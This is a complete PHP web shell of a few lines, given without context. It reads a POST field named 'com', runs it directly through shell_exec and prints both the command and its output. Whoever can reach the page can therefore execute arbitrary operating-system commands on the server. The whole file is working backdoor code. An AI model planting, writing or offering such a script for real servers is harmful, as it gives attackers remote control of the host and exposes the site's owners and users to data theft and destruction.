<?php
if (isset($_POST["com"])) {

    $com = shell_exec($_POST["com"] . "; echo $?");
    echo $_POST["com"] . "\r\n" . $com;
}
